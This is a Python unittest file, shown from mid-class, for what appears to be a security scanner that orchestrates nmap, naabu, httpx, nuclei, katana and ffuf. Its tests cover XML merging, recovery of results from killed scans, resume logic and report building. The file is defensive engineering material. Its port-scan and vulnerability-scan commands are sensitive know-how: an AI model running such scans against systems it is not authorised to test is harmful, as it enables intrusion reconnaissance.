                fh.write("#!/usr/bin/env bash\n"
                        "nmap -Pn -sV --top-ports 1000 203.0.113.64 203.0.113.92\n"
                        "httpx -silent -json -list -\n")
        if with_nmapview_html:
            with open(os.path.join(out_dir, "raw", "nmapview.html"), "w",
                     encoding="utf-8") as fh:
                fh.write("<!doctype html><title>NmapView</title>rendered")
        s = Store(os.path.join(out_dir, "assay.db"))
        s.start_run("standard", ["203.0.113.64"])
        s.add_finding(Finding(
            title="x", target="x", severity="low", confidence="confirmed",
            module="m", category="c", cwe="", impact="i", detail="d", repro="r",
            evidence=[Evidence(kind="http", label="e", output="e")]))
        out_path = os.path.join(out_dir, "r.html")
        html = open(report.build(s, {"hosts": 1, "web": 0, "requests": 1,
                                     "duration": 1.0}, out_path)).read()
        return html, out_dir

    def test_section_absent_when_no_raw_nmap_data(self):
        import os, tempfile
        from assay import report
        from assay.models import Evidence, Finding
        from assay.store import Store
        out_dir = tempfile.mkdtemp()
        s = Store(os.path.join(out_dir, "assay.db"))
        s.start_run("standard", ["t"])
        s.add_finding(Finding(
            title="x", target="x", severity="low", confidence="confirmed",
            module="m", category="c", cwe="", impact="i", detail="d", repro="r",
            evidence=[Evidence(kind="http", label="e", output="e")]))
        html = open(report.build(s, {"hosts": 1, "web": 0, "requests": 1,
                                     "duration": 1.0},
                                 os.path.join(out_dir, "r.html"))).read()
        # "nmap-data" alone also matches the always-present CSS selector for
        # this section, so check for the section element specifically.
        self.assertNotIn('id="nmap-data"', html)

    def test_section_present_with_raw_command_and_xml(self):
        html, _ = self._report_with_raw()
        self.assertIn('id="nmap-data"', html)
        self.assertIn("nmap -Pn -sV --top-ports 1000", html)
        self.assertNotIn("httpx", html.split('id="nmap-data"')[1].split("</section>")[0])
        # the raw XML lands in a normal <pre>, so it must be HTML-escaped.
        self.assertIn("&lt;hostname name=", html)
        pre_block = html.split("<pre>")[1].split("</pre>")[0]
        self.assertNotIn("<hostname name=", pre_block)

    def test_no_beautified_link_without_a_rendered_file(self):
        html, _ = self._report_with_raw(with_nmapview_html=False)
        section = html.split('id="nmap-data"')[1].split("</section>")[0]
        self.assertNotIn("raw/nmapview.html", section)
        self.assertIn("not available yet", section)

    def test_beautified_link_present_once_rendered(self):
        html, _ = self._report_with_raw(with_nmapview_html=True)
        section = html.split('id="nmap-data"')[1].split("</section>")[0]
        self.assertIn('href="raw/nmapview.html"', section)
        self.assertIn('target="_blank"', section)

    def test_both_base_and_extra_scans_get_separate_raw_blocks(self):
        import os
        html, out_dir = self._report_with_raw()
        with open(os.path.join(out_dir, "raw", "nmap-extra.xml"), "w",
                 encoding="utf-8") as fh:
            fh.write(_NMAP_XML_SAMPLE)
        from assay import report
        from assay.store import Store
        s = Store(os.path.join(out_dir, "assay.db"))
        html2 = open(report.build(s, {"hosts": 1, "web": 0, "requests": 1,
                                      "duration": 1.0},
                                  os.path.join(out_dir, "r.html"))).read()
        self.assertIn("base scan", html2)
        self.assertIn("AI/ML port scan", html2)


class MergeNmapXmlFilesTests(unittest.TestCase):
    """merge_nmap_xml_files() combines a run's several nmap XML files (base
    scan, AI/ML-ports follow-up, reverse-DNS-discovered-hosts follow-up)
    into one document for NmapView to render, joining on each host's
    address so a host scanned twice gets the union of its ports rather than
    only whichever file happened to be merged in last."""

    def _write(self, tmp_dir, name, xml):
        import os
        path = os.path.join(tmp_dir, name)
        with open(path, "w", encoding="utf-8") as fh:
            fh.write(xml)
        return path

    def test_single_file_is_copied_through(self):
        import os, tempfile
        from assay import tools
        tmp = tempfile.mkdtemp()
        src = self._write(tmp, "a.xml", _NMAP_XML_SAMPLE)
        out = os.path.join(tmp, "merged.xml")
        self.assertTrue(tools.merge_nmap_xml_files([src], out))
        result = tools.parse_nmap_xml(out)
        self.assertIn("203.0.113.64", result)
        self.assertIn("203.0.113.92", result)

    def test_same_host_in_both_files_gets_union_of_ports(self):
        import os, tempfile
        from assay import tools
        tmp = tempfile.mkdtemp()
        base = self._write(tmp, "base.xml", """<?xml version="1.0"?>
<nmaprun><host><status state="up"/>
<address addr="10.0.0.5" addrtype="ipv4"/>
<ports><port protocol="tcp" portid="443">
<state state="open"/><service name="https"/></port></ports>
</host></nmaprun>""")
        extra = self._write(tmp, "extra.xml", """<?xml version="1.0"?>
<nmaprun><host><status state="up"/>
<address addr="10.0.0.5" addrtype="ipv4"/>
<ports><port protocol="tcp" portid="11434">
<state state="open"/><service name="http"/></port></ports>
</host></nmaprun>""")
        out = os.path.join(tmp, "merged.xml")
        self.assertTrue(tools.merge_nmap_xml_files([base, extra], out))
        result = tools.parse_nmap_xml(out)
        self.assertEqual(len(result), 1, "one host, not two entries for it")
        ports = sorted(p.port for p in result["10.0.0.5"].ports)
        self.assertEqual(ports, [443, 11434])

    def test_host_only_in_second_file_is_appended(self):
        import os, tempfile
        from assay import tools
        tmp = tempfile.mkdtemp()
        base = self._write(tmp, "base.xml", """<?xml version="1.0"?>
<nmaprun><host><status state="up"/>
<address addr="10.0.0.5" addrtype="ipv4"/>
<ports><port protocol="tcp" portid="443">
<state state="open"/><service name="https"/></port></ports>
</host></nmaprun>""")
        extra = self._write(tmp, "extra.xml", """<?xml version="1.0"?>
<nmaprun><host><status state="up"/>
<address addr="10.0.0.9" addrtype="ipv4"/>
<ports><port protocol="tcp" portid="22">
<state state="open"/><service name="ssh"/></port></ports>
</host></nmaprun>""")
        out = os.path.join(tmp, "merged.xml")
        self.assertTrue(tools.merge_nmap_xml_files([base, extra], out))
        result = tools.parse_nmap_xml(out)
        self.assertEqual(set(result.keys()), {"10.0.0.5", "10.0.0.9"})

    def test_missing_files_are_skipped_not_fatal(self):
        import os, tempfile
        from assay import tools
        tmp = tempfile.mkdtemp()
        src = self._write(tmp, "a.xml", _NMAP_XML_SAMPLE)
        out = os.path.join(tmp, "merged.xml")
        self.assertTrue(tools.merge_nmap_xml_files(
            [os.path.join(tmp, "does-not-exist.xml"), src], out))

    def test_no_existing_files_fails_cleanly(self):
        import os, tempfile
        from assay import tools
        tmp = tempfile.mkdtemp()
        out = os.path.join(tmp, "merged.xml")
        self.assertFalse(tools.merge_nmap_xml_files(
            [os.path.join(tmp, "nope.xml")], out))


class NmapXmlPrefixTests(unittest.TestCase):
    """A run that calls nmap_scan() more than once (the initial port scan,
    then a follow-up for reverse-DNS-discovered hostnames) must not have the
    second call silently overwrite the first's raw XML -- xml_prefix keeps
    their output files distinct."""

    def test_default_prefix_is_nmap(self):
        from assay import tools
        seen = []
        original = tools.stream_lines

        def fake_stream(cmd, timeout=900.0, stdin="", ledger=True):
            seen.append(list(cmd))
            return iter(())

        tools.stream_lines = fake_stream
        try:
            tools.nmap_scan(["10.0.0.5"], "top-1000", {})
        finally:
            tools.stream_lines = original
        oX_values = [cmd[cmd.index("-oX") + 1] for cmd in seen if "-oX" in cmd]
        self.assertTrue(any(v.endswith("nmap.xml") for v in oX_values))

    def test_custom_prefix_changes_the_output_filenames(self):
        from assay import tools
        seen = []
        original = tools.stream_lines

        def fake_stream(cmd, timeout=900.0, stdin="", ledger=True):
            seen.append(list(cmd))
            return iter(())

        tools.stream_lines = fake_stream
        try:
            tools.nmap_scan(["10.0.0.5"], "top-1000", {}, xml_prefix="nmap-discovered")
        finally:
            tools.stream_lines = original
        oX_values = [cmd[cmd.index("-oX") + 1] for cmd in seen if "-oX" in cmd]
        self.assertTrue(any(v.endswith("nmap-discovered.xml") for v in oX_values))
        self.assertFalse(any(v.endswith(("/nmap.xml",)) for v in oX_values))


class ResumeCliWiringTests(unittest.TestCase):
    """--resume has to actually reach Config.resume, not just parse."""

    def test_the_flag_reaches_config(self):
        from assay.cli import build_parser, make_config
        p = build_parser()
        args = p.parse_args(["scan", "10.0.0.1", "-n", "wiring-on", "-q", "--resume"])
        self.assertTrue(args.resume)
        self.assertTrue(make_config(args).resume)

    def test_it_defaults_off(self):
        from assay.cli import build_parser, make_config
        p = build_parser()
        args = p.parse_args(["scan", "10.0.0.1", "-n", "wiring-off", "-q"])
        self.assertFalse(args.resume)
        self.assertFalse(make_config(args).resume)


class TargetListFileTests(unittest.TestCase):
    """_target_list_file: the mechanism every -list-taking tool wrapper now
    shares, replacing "-list -" (naabu/katana take that literally and try to
    open a file named "-") and stdin (nuclei has shipped bugs where stdin
    piped in via subprocess.Popen specifically was never read at all -
    projectdiscovery/nuclei#2032)."""

    def test_writes_one_item_per_line(self):
        from assay import tools
        with tools._target_list_file(["a", "b", "c"]) as path:
            with open(path) as fh:
                self.assertEqual(fh.read().split(), ["a", "b", "c"])

    def test_the_file_is_gone_after_the_with_block(self):
        from assay import tools
        with tools._target_list_file(["a"]) as path:
            captured = path
        self.assertFalse(os.path.exists(captured))

    def test_cleans_up_even_when_the_body_raises(self):
        from assay import tools
        captured = []
        with self.assertRaises(ValueError):
            with tools._target_list_file(["a"]) as path:
                captured.append(path)
                raise ValueError("boom")
        self.assertFalse(os.path.exists(captured[0]))

    def test_a_generator_still_cleans_up_on_an_early_break(self):
        """The real usage: `with _target_list_file(...) as p: yield from ...`
        inside a generator function. A caller that breaks out early must
        still trigger the cleanup, or every capped consumer (katana_crawl's
        own max_urls break, among others) would leak a temp file per call."""
        from assay import tools
        captured = []

        def gen():
            with tools._target_list_file(["a", "b"]) as path:
                captured.append(path)
                yield from iter(["x", "y", "z"])

        out = []
        for item in gen():
            out.append(item)
            if item == "y":
                break
        self.assertEqual(out, ["x", "y"])
        self.assertFalse(os.path.exists(captured[0]),
                         "breaking the for loop must still run the finally")


class ToolTargetFileWiringTests(unittest.TestCase):
    """Every -list-taking wrapper must route through a real file, never
    "-list -" (naabu 2.4.0's literal-file bug) and never bare stdin (nuclei's
    subprocess-stdin bug) - this is what made a crawl of 218 live endpoints
    silently return zero URLs, and made httpx silently fall back to the slow
    native probe path with no visible error."""

    def _fake_stream_json(self, seen_cmds, seen_contents):
        def fake(cmd, timeout=900.0):
            seen_cmds.append(list(cmd))
            if "-list" in cmd:
                path = cmd[cmd.index("-list") + 1]
                with open(path) as fh:
                    seen_contents.append(fh.read().split())
            return iter(())
        return fake

    def test_httpx_probe_writes_a_real_list_file(self):
        from assay import tools
        seen_cmds, seen_contents = [], []
        original = tools.stream_json
        tools.stream_json = self._fake_stream_json(seen_cmds, seen_contents)
        try:
            list(tools.httpx_probe(["10.0.0.1:80", "10.0.0.2:443"], {}))
        finally:
            tools.stream_json = original
        self.assertTrue(seen_cmds)
        self.assertNotEqual(seen_cmds[0][seen_cmds[0].index("-list") + 1], "-")
        self.assertEqual(seen_contents, [["10.0.0.1:80", "10.0.0.2:443"]])

    def test_nuclei_scan_writes_a_real_list_file(self):
        from assay import tools
        seen_cmds, seen_contents = [], []
        original = tools.stream_json
        tools.stream_json = self._fake_stream_json(seen_cmds, seen_contents)
        try:
            list(tools.nuclei_scan(["https://10.0.0.1/"], "high,critical", {}))
        finally:
            tools.stream_json = original
        self.assertTrue(seen_cmds)
        self.assertNotEqual(seen_cmds[0][seen_cmds[0].index("-list") + 1], "-")
        self.assertEqual(seen_contents, [["https://10.0.0.1/"]])

    def test_katana_crawl_writes_a_real_list_file(self):
        from assay import tools
        seen_cmds, seen_contents = [], []
        original = tools.stream_json
        tools.stream_json = self._fake_stream_json(seen_cmds, seen_contents)
        try:
            tools.katana_crawl(["https://10.0.0.1/"], depth=2, tune={}, max_urls=60)
        finally:
            tools.stream_json = original
        self.assertTrue(seen_cmds)
        self.assertNotEqual(seen_cmds[0][seen_cmds[0].index("-list") + 1], "-")
        self.assertEqual(seen_contents, [["https://10.0.0.1/"]])

    def test_katana_crawl_no_longer_passes_js_crawl_unintentionally(self):
        """-jc is katana's alias for -js-crawl, not "give me the complete
        JSON object" as its presence here implied; -jsonl already includes
        request.endpoint/response, which is the field this function reads."""
        from assay import tools
        seen_cmds = []
        original = tools.stream_json
        tools.stream_json = lambda cmd, timeout=900.0: (seen_cmds.append(list(cmd)), iter(()))[1]
        try:
            tools.katana_crawl(["https://10.0.0.1/"], depth=2, tune={}, max_urls=60)
        finally:
            tools.stream_json = original
        self.assertNotIn("-jc", seen_cmds[0])

    def test_kf_is_a_single_choice_not_a_comma_list(self):
        """Reproduced against a real installed katana: "-kf
        robotstxt,sitemapxml" is rejected outright ("invalid value ...
        allowed values are , all, robotstxt, sitemapxml"), exit code 2, in
        well under a second -- indistinguishable from a real empty crawl
        until you check the exit code, which is exactly what "crawl: 0
        URL(s)" against 155 live endpoints turned out to be. "all" is the
        single choice that covers both robots.txt and sitemap.xml."""
        from assay import tools
        seen_cmds = []
        original = tools.stream_json

        def fake(cmd, timeout=900.0):
            seen_cmds.append(list(cmd))
            return iter(())

        tools.stream_json = fake
        try:
            tools.katana_crawl(["https://10.0.0.1/"], depth=2, tune={}, max_urls=60)
        finally:
            tools.stream_json = original
        cmd = seen_cmds[0]
        self.assertIn("-kf", cmd)
        self.assertEqual(cmd[cmd.index("-kf") + 1], "all")

    def test_dnsx_resolve_writes_a_real_list_file(self):
        from assay import tools
        seen_cmds, seen_contents = [], []
        original = tools.stream_json
        tools.stream_json = self._fake_stream_json(seen_cmds, seen_contents)
        try:
            list(tools.dnsx_resolve(["a.test", "b.test"]))
        finally:
            tools.stream_json = original
        self.assertTrue(seen_cmds)
        self.assertNotEqual(seen_cmds[0][seen_cmds[0].index("-list") + 1], "-")
        self.assertEqual(seen_contents, [["a.test", "b.test"]])

    def test_none_of_the_four_ever_pass_stdin_to_stream_json(self):
        """The whole point: not stdin either, for the reason in
        TargetListFileTests' docstring. fake() has no stdin parameter at
        all, so any caller still passing it would raise TypeError here
        rather than this assertion quietly proving nothing."""
        from assay import tools
        calls = [0]

        def fake(cmd, timeout=900.0):
            calls[0] += 1
            return iter(())

        original = tools.stream_json
        tools.stream_json = fake
        try:
            list(tools.httpx_probe(["10.0.0.1:80"], {}))
            list(tools.nuclei_scan(["https://10.0.0.1/"], "high", {}))
            tools.katana_crawl(["https://10.0.0.1/"], depth=1, tune={}, max_urls=10)
            list(tools.dnsx_resolve(["a.test"]))
        finally:
            tools.stream_json = original
        self.assertEqual(calls[0], 4)


class ResumableNmapHostsTests(unittest.TestCase):
    """tools.resumable_nmap_hosts() is the whole mechanism --resume rests on."""

    def _dir_with(self, xml_body):
        import os, tempfile
        d = tempfile.mkdtemp()
        os.makedirs(os.path.join(d, "raw"), exist_ok=True)
        with open(os.path.join(d, "raw", "nmap.xml"), "w", encoding="utf-8") as fh:
            fh.write(xml_body)
        return d

    HEAD = ('<?xml version="1.0" encoding="UTF-8"?>\n'
            '<nmaprun scanner="nmap" args="nmap -sV" start="1700000000">\n')
    HOST = ('<host><address addr="10.0.0.%d" addrtype="ipv4"/><ports>'
            '<port protocol="tcp" portid="%d"><state state="open"/>'
            '<service name="%s"/></port></ports></host>\n')

    def test_recovers_hosts_from_a_killed_scan_the_same_as_a_finished_one(self):
        """The scan that motivated this: killed at 90%%, nothing salvaged
        before parse_nmap_xml's own fix, and now the resume path on top of
        it - two hosts complete, no closing tag at all."""
        from assay import tools
        d = self._dir_with(self.HEAD + self.HOST % (1, 443, "https")
                           + self.HOST % (2, 80, "http"))
        result = tools.resumable_nmap_hosts(d)
        self.assertEqual(sorted(result), ["10.0.0.1", "10.0.0.2"])

    def test_no_file_yet_is_not_an_exception(self):
        import tempfile
        from assay import tools
        self.assertEqual(tools.resumable_nmap_hosts(tempfile.mkdtemp()), {})

    def test_reads_the_prefix_it_is_given(self):
        import os
        from assay import tools
        d = self._dir_with(self.HEAD + self.HOST % (1, 443, "https") + "</nmaprun>\n")
        os.rename(os.path.join(d, "raw", "nmap.xml"),
                 os.path.join(d, "raw", "nmap-discovered.xml"))
        self.assertEqual(tools.resumable_nmap_hosts(d), {})
        self.assertEqual(sorted(tools.resumable_nmap_hosts(d, "nmap-discovered")),
                         ["10.0.0.1"])


class NmapXmlFileListTests(unittest.TestCase):
    """One list, used by both the report and NmapView - not two copies that
    can drift when a "-previous" sibling is added for --resume."""

    def test_every_base_file_has_a_previous_sibling(self):
        from assay import tools
        names = {n for n, _ in tools.NMAP_XML_FILES}
        for base in ("nmap.xml", "nmap-extra.xml",
                     "nmap-discovered.xml", "nmap-discovered-extra.xml"):
            self.assertIn(base, names)
            self.assertIn(base.replace(".xml", "-previous.xml"), names)

    def test_report_and_nmapview_read_the_same_list(self):
        import assay.report as report_mod
        from assay import tools
        self.assertIs(report_mod.NMAP_XML_FILES, tools.NMAP_XML_FILES)


class CutOffNmapScanTests(unittest.TestCase):
    """A scan stopped by its timeout must keep the hosts it already finished.

    nmap writes each <host> as it completes it and the closing </nmaprun>
    only on a clean exit, so a killed scan leaves a file that is a good list
    of results and not a valid document. Reading that as "nothing was found"
    discarded half an hour of subnet sweep and left the run with no ports, no
    web targets, and nothing to test.
    """

    def _write(self, body: str) -> str:
        import os, tempfile
        path = os.path.join(tempfile.mkdtemp(), "nmap.xml")
        with open(path, "w", encoding="utf-8") as fh:
            fh.write(body)
        return path

    HEAD = ('<?xml version="1.0" encoding="UTF-8"?>\n'
            '<nmaprun scanner="nmap" args="nmap -sV" start="1700000000">\n'
            '<scaninfo type="syn" protocol="tcp"/>\n')
    HOST = ('<host><address addr="10.0.0.%d" addrtype="ipv4"/><ports>'
            '<port protocol="tcp" portid="%d"><state state="open"/>'
            '<service name="%s" product="nginx"/></port></ports></host>\n')

    def test_completed_hosts_survive_a_missing_closing_tag(self):
        from assay import tools
        path = self._write(self.HEAD + self.HOST % (1, 443, "https")
                           + self.HOST % (2, 80, "http"))
        result = tools.parse_nmap_xml(path)
        self.assertEqual(sorted(result), ["10.0.0.1", "10.0.0.2"])
        self.assertEqual([p.port for p in result["10.0.0.1"].ports], [443])
        self.assertEqual(result["10.0.0.2"].ports[0].product, "nginx",
                         "a salvaged host keeps its -sV detail, not just a port")

    def test_a_host_cut_off_mid_write_is_dropped_not_guessed(self):
        """Only complete <host> elements count; a partial one is not a result."""
        from assay import tools
        path = self._write(self.HEAD + self.HOST % (1, 443, "https")
                           + '<host><address addr="10.0.0.9" addrtype="ipv4"/><por')
        result = tools.parse_nmap_xml(path)
        self.assertEqual(sorted(result), ["10.0.0.1"])

    def test_a_file_with_no_finished_host_yields_nothing(self):
        from assay import tools
        self.assertEqual(tools.parse_nmap_xml(self._write(self.HEAD)), {})

    def test_garbage_is_not_salvaged_into_results(self):
        from assay import tools
        self.assertEqual(tools.parse_nmap_xml(self._write("not xml at all")), {})

    def test_a_missing_file_is_not_an_exception(self):
        from assay import tools
        self.assertEqual(tools.parse_nmap_xml("/nonexistent/nmap.xml"), {})

    def test_a_salvage_is_announced_not_silent(self):
        """Partial results that read as complete are worse than no results."""
        from assay import tools
        told = []
        path = self._write(self.HEAD + self.HOST % (1, 443, "https"))
        with _sink(told):
            tools.parse_nmap_xml(path)
        events = [m for m, tick in told if not tick]
        self.assertEqual(len(events), 1, told)
        self.assertIn("truncated", events[0])

    def test_a_complete_scan_is_not_reported_as_salvaged(self):
        from assay import tools
        told = []
        path = self._write(self.HEAD + self.HOST % (1, 443, "https") + "</nmaprun>\n")
        with _sink(told):
            result = tools.parse_nmap_xml(path)
        self.assertEqual(sorted(result), ["10.0.0.1"])
        self.assertEqual(told, [])


class PortscanSkipsNmapWhenFullyResumedTests(unittest.TestCase):
    """The point of --resume: a fully-covered scan must not touch nmap/naabu
    at all, not just narrow their input to zero and call them anyway."""

    def test_nmap_and_naabu_are_never_invoked(self):
        import os, tempfile
        from assay.config import Config
        from assay.engine import Engine
        from assay import tools

        out = tempfile.mkdtemp()
        raw = os.path.join(out, "raw")
        os.makedirs(raw, exist_ok=True)
        with open(os.path.join(raw, "nmap.xml"), "w", encoding="utf-8") as fh:
            fh.write('<?xml version="1.0"?><nmaprun args="nmap -sV" start="1">\n'
                    '<host><address addr="10.0.0.1" addrtype="ipv4"/><ports>'
                    '<port protocol="tcp" portid="443"><state state="open"/>'
                    '<service name="https"/></port></ports></host>\n'
                    '</nmaprun>\n')
        eng = Engine(Config(targets=["10.0.0.1"], out_dir=out, resume=True, journal=False))

        called = []
        original_nmap, original_naabu = tools.nmap_scan, tools.naabu_scan
        tools.nmap_scan = lambda *a, **k: called.append("nmap") or {}
        tools.naabu_scan = lambda *a, **k: called.append("naabu") or {}
        try:
            eng._stage_resolve()
            eng._stage_portscan()
        finally:
            tools.nmap_scan, tools.naabu_scan = original_nmap, original_naabu
        self.assertEqual(called, [], "a fully-covered scan must skip both")
        self.assertEqual([p.port for p in eng.ctx.targets[0].ports], [443],
                         "and still end up with the recovered port data")


class ApplyResumeTests(unittest.TestCase):
    """Engine._apply_resume: the actual --resume mechanism, end to end
    against a real Engine and a real (small) nmap.xml on disk."""

    def _engine(self):
        import tempfile
        from assay.config import Config
        from assay.engine import Engine
        self.out = tempfile.mkdtemp()
        return Engine(Config(targets=["10.0.0.1", "10.0.0.2"], out_dir=self.out,
                             resume=True, journal=False))

    def _write_xml(self, eng, body, name="nmap.xml"):
        import os
        raw = os.path.join(eng.cfg.out_dir, "raw")
        os.makedirs(raw, exist_ok=True)
        with open(os.path.join(raw, name), "w", encoding="utf-8") as fh:
            fh.write(body)

    HEAD = ('<?xml version="1.0" encoding="UTF-8"?>\n'
            '<nmaprun scanner="nmap" args="nmap -sV" start="1700000000">\n')
    HOST = ('<host><address addr="10.0.0.%d" addrtype="ipv4"/><ports>'
            '<port protocol="tcp" portid="%d"><state state="open"/>'
            '<service name="%s"/></port></ports></host>\n')

    def test_a_covered_host_is_dropped_from_the_work_left_to_do(self):
        from assay.models import Target
        eng = self._engine()
        self._write_xml(eng, self.HEAD + self.HOST % (1, 443, "https"))  # killed, no closing tag
        t1 = Target(raw="10.0.0.1", host="10.0.0.1", ip="10.0.0.1")
        t2 = Target(raw="10.0.0.2", host="10.0.0.2", ip="10.0.0.2")
        remaining = eng._apply_resume([t1, t2], "nmap")
        self.assertEqual([t.host for t in remaining], ["10.0.0.2"],
                         "the recovered host must not be re-scanned")
        self.assertEqual([p.port for p in t1.ports], [443],
                         "the recovered host's ports must still be populated")

    def test_the_recovered_host_is_saved_to_the_store(self):
        from assay.models import Target
        eng = self._engine()
        self._write_xml(eng, self.HEAD + self.HOST % (1, 443, "https"))
        t1 = Target(raw="10.0.0.1", host="10.0.0.1", ip="10.0.0.1")
        eng._apply_resume([t1], "nmap")
        rows = eng.store.host_rows()
        self.assertEqual(len(rows), 1)

    def test_nothing_on_disk_means_nothing_is_skipped(self):
        from assay.models import Target
        eng = self._engine()
        t1 = Target(raw="10.0.0.1", host="10.0.0.1", ip="10.0.0.1")
        remaining = eng._apply_resume([t1], "nmap")
        self.assertEqual(remaining, [t1])

    def test_a_host_scanned_and_found_completely_closed_is_rescanned(self):
        """Documented, deliberate: parse_nmap_xml drops a host with no ports
        and no hostname, so resume cannot tell "clean" from "never scanned"
        and conservatively re-scans it. Wasteful, never wrong."""
        from assay.models import Target
        eng = self._engine()
        empty_host = ('<host><address addr="10.0.0.9" addrtype="ipv4"/>'
                     '<ports></ports></host>\n')
        self._write_xml(eng, self.HEAD + self.HOST % (1, 443, "https") + empty_host)
        t1 = Target(raw="10.0.0.1", host="10.0.0.1", ip="10.0.0.1")
        t9 = Target(raw="10.0.0.9", host="10.0.0.9", ip="10.0.0.9")
        remaining = eng._apply_resume([t1, t9], "nmap")
        self.assertEqual([t.host for t in remaining], ["10.0.0.9"])

    def test_every_host_covered_leaves_nothing_to_scan(self):
        from assay.models import Target
        eng = self._engine()
        self._write_xml(eng, self.HEAD + self.HOST % (1, 443, "https") + "</nmaprun>\n")
        t1 = Target(raw="10.0.0.1", host="10.0.0.1", ip="10.0.0.1")
        self.assertEqual(eng._apply_resume([t1], "nmap"), [])


class RunStageTests(unittest.TestCase):
    """Engine._run_stage: the wrapper every top-level stage goes through -
    clears any skip left from the stage before it, records the outcome
    durably, and never lets an exception masquerade as a clean skip."""

    def _engine(self, resume=False):
        import tempfile
        from assay.config import Config
        from assay.engine import Engine
        self.out = tempfile.mkdtemp()
        return Engine(Config(targets=["10.0.0.1"], out_dir=self.out,
                             resume=resume, journal=False))

    def tearDown(self):
        from assay import tools
        tools.SKIP.clear()

    def test_a_normal_stage_is_recorded_completed(self):
        eng = self._engine()
        eng._run_stage("resolve", lambda: None)
        self.assertEqual(eng.store.stage_status("resolve"), "completed")

    def test_an_exception_is_recorded_failed_and_still_propagates(self):
        eng = self._engine()

        def boom():
            raise ValueError("nope")

        with self.assertRaises(ValueError):
            eng._run_stage("probe", boom)
        self.assertEqual(eng.store.stage_status("probe"), "failed")

    def test_a_skip_set_during_the_stage_is_recorded_skipped(self):
        from assay import tools
        eng = self._engine()

        def during():
            tools.SKIP.set()

        eng._run_stage("urls", during)
        self.assertEqual(eng.store.stage_status("urls"), "skipped")

    def test_a_skip_does_not_leak_into_the_next_stage(self):
        """The whole reason this clears SKIP at the START of a stage, not
        just after: a press near the end of one stage must not also cut the
        very first call of the next one short for no reason asked."""
        from assay import tools
        eng = self._engine()
        tools.SKIP.set()  # simulating: still set from whatever ran before
        eng._run_stage("resolve", lambda: None)
        self.assertEqual(eng.store.stage_status("resolve"), "completed")
        self.assertFalse(tools.SKIP.is_set())


class RunModuleSkipTests(unittest.TestCase):
    """The other half of skip's stage-wide reach: once set, a worker must
    decline NEW module work, not just let already-running calls cut short
    on their own. Content discovery - one ffuf call per web target - is
    exactly the shape this matters for."""

    def _engine(self):
        import tempfile
        from assay.config import Config
        from assay.engine import Engine
        self.out = tempfile.mkdtemp()
        return Engine(Config(targets=["10.0.0.1"], out_dir=self.out, journal=False))

    def tearDown(self):
        from assay import tools
        tools.SKIP.clear()

    def test_a_module_is_skipped_once_the_flag_is_set(self):
        from assay import tools
        from assay.modules import Module

        class _Spy(Module):
            name = "spy"
            stage = "probe"
            scope = "global"
            called = False

            def run_global(self, ctx):
                self.called = True
                return []

        eng = self._engine()
        m = _Spy()
        tools.SKIP.set()
        result = eng._run_module(m, "global", None)
        self.assertEqual(result, [])
        self.assertFalse(m.called, "the module body must never run at all")

    def test_without_a_skip_the_module_runs_normally(self):
        from assay.modules import Module

        class _Spy(Module):
            name = "spy"
            stage = "probe"
            scope = "global"

            def run_global(self, ctx):
                return ["ran"]

        eng = self._engine()
        self.assertEqual(eng._run_module(_Spy(), "global", None), ["ran"])


class ApplyProbeResumeTests(unittest.TestCase):
    """Engine._apply_probe_resume: reuse a prior run's confirmed live
    endpoints, matched by (host, port) since a candidate doesn't know its
    scheme until probed - and never let a fully-resumed probe skip the
    gateway filter or baseline calibration that a fresh one always gets."""

    def _engine(self, resume=True):
        import tempfile
        from assay.config import Config
        from assay.engine import Engine
        self.out = tempfile.mkdtemp()
        return Engine(Config(targets=["10.0.0.1", "10.0.0.2"], out_dir=self.out,
                             resume=resume, journal=False, detect_gateway=False))

    def _complete_probe_with(self, eng, *web_targets):
        """Simulate a prior run whose probe stage completed with these
        WebTargets already on disk."""
        sid = eng.store.stage_started("probe")
        for wt in web_targets:
            eng.store.save_web_target(wt)
        eng.store.stage_finished(sid, "completed")

    def _candidates(self, eng):
        from assay.models import Port, Target
        t1 = Target(raw="10.0.0.1", host="10.0.0.1", ip="10.0.0.1")
        t2 = Target(raw="10.0.0.2", host="10.0.0.2", ip="10.0.0.2")
        return [(t1, Port(port=443)), (t2, Port(port=8080))]

    def test_a_covered_candidate_is_dropped_and_restored_to_ctx_web(self):
        from assay.models import WebTarget
        eng = self._engine()
        wt = WebTarget(url="https://10.0.0.1:443/", host="10.0.0.1", port=443,
                       scheme="https", status=200)
        self._complete_probe_with(eng, wt)
        remaining = eng._apply_probe_resume(self._candidates(eng))
        self.assertEqual([(t.host, p.port) for t, p in remaining], [("10.0.0.2", 8080)])
        self.assertEqual([w.url for w in eng.ctx.web], ["https://10.0.0.1:443/"])

    def test_probe_never_attempted_before_probes_everything(self):
        eng = self._engine()
        candidates = self._candidates(eng)
        self.assertEqual(eng._apply_probe_resume(candidates), candidates)

    def test_a_skipped_prior_probe_is_not_trusted(self):
        eng = self._engine()
        sid = eng.store.stage_started("probe")
        eng.store.stage_finished(sid, "skipped")
        candidates = self._candidates(eng)
        self.assertEqual(eng._apply_probe_resume(candidates), candidates)

    def test_completed_but_nothing_recorded_falls_through_to_a_fresh_probe(self):
        """Completed and genuinely found zero live endpoints - honour that
        rather than pretending there is nothing to check ever again."""
        eng = self._engine()
        sid = eng.store.stage_started("probe")
        eng.store.stage_finished(sid, "completed")
        candidates = self._candidates(eng)
        self.assertEqual(eng._apply_probe_resume(candidates), candidates)

    def test_full_stage_still_gateway_filters_and_calibrates_on_a_full_resume(self):
        """Both of these used to run only on the code path that actually
        called httpx/the native pool - a fully-resumed probe (0 candidates
        left) skipped straight past them entirely."""
        from assay.models import Port, Target, WebTarget
        eng = self._engine()
        # What _stage_resolve() would have populated - a real run needs
        # ports on ctx.targets before it ever builds a candidate list, and
        # this test bypasses resolve entirely to isolate the probe stage.
        eng.ctx.targets = [
            Target(raw="10.0.0.1", host="10.0.0.1", ip="10.0.0.1", ports=[Port(port=443)]),
            Target(raw="10.0.0.2", host="10.0.0.2", ip="10.0.0.2", ports=[Port(port=8080)]),
        ]

        wt = WebTarget(url="https://10.0.0.1:443/", host="10.0.0.1", port=443,
                       scheme="https", status=200)
        self._complete_probe_with(eng, wt)
        # A second target so _apply_probe_resume covers everything the fresh
        # candidate list would have asked for.
        wt2 = WebTarget(url="http://10.0.0.2:8080/", host="10.0.0.2", port=8080,
                        scheme="http", status=200)
        eng.store.save_web_target(wt2)

        called = []
        eng._filter_gateway = lambda: called.append("filter")
        eng._calibrate = lambda: called.append("calibrate")
        eng._stage_probe()
        self.assertEqual(called, ["filter", "calibrate"])
        self.assertEqual(sorted(w.url for w in eng.ctx.web),
                         ["http://10.0.0.2:8080/", "https://10.0.0.1:443/"])

